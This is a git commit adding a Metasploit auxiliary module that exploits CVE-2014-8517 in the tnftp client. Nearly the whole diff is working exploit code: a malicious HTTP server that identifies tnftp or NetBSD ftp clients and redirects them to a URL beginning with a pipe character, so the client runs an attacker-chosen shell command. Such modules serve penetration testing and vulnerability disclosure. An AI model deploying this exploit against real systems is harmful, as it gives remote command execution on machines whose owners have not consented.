e3ed7905f1d0e570621ce4f36bc4e3426b39fb75
William Vu <William_Vu@rapid7.com>
2014-10-30 17:48:36 -0500

    Add tnftp_savefile exploit
    Also add URI{HOST,PORT} and {,v}print_good to HttpServer.

---
+++ modules/auxiliary/server/tnftp_savefile.rb
@@ -0,0 +1,79 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit4 < Msf::Auxiliary
+
+  include Msf::Exploit::Remote::HttpServer
+  include Msf::Auxiliary::Report
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'tnftp "savefile" Arbitrary Command Execution',
+      'Description' => %q{
+        This module exploits a vulnerability.
+      },
+      'Author' => [
+        'Jared McNeill', # Vulnerability discovery
+        'wvu' # Metasploit module
+      ],
+      'References' => [
+        ['CVE', '2014-8517'],
+        ['URL', 'http://seclists.org/oss-sec/2014/q4/459']
+      ],
+      'DisclosureDate' => 'Oct 28 2014',
+      'License' => MSF_LICENSE,
+      'Actions' => [
+        ['Service']
+      ],
+      'PassiveActions' => [
+        'Service'
+      ],
+      'DefaultAction' => 'Service'
+    ))
+
+    register_options([
+      OptString.new('CMD', [true, 'Command to run', 'uname -a'])
+    ])
+  end
+
+  def run
+    exploit
+  end
+
+  def on_request_uri(cli, request)
+    unless request['User-Agent'] =~ /(tn|NetBSD-)ftp/
+      print_status("#{request['User-Agent']} connected")
+      send_not_found(cli)
+      return
+    end
+
+    if request.uri.ends_with?(sploit)
+      send_response(cli, '')
+      print_good("Executing `#{datastore['CMD']}'!")
+      report_vuln(
+        :host => cli.peerhost,
+        :name => self.name,
+        :refs => self.references,
+        :info => request['User-Agent']
+      )
+    else
+      print_status("#{request['User-Agent']} connected")
+      print_status('Redirecting to exploit...')
+      send_redirect(cli, sploit_uri)
+    end
+  end
+
+  def sploit_uri
+    (get_uri.ends_with?('/') ? get_uri : "#{get_uri}/") +
+      Rex::Text.uri_encode(sploit, 'hex-all')
+  end
+
+  def sploit
+    "|#{datastore['CMD']}"
+  end
+
+end
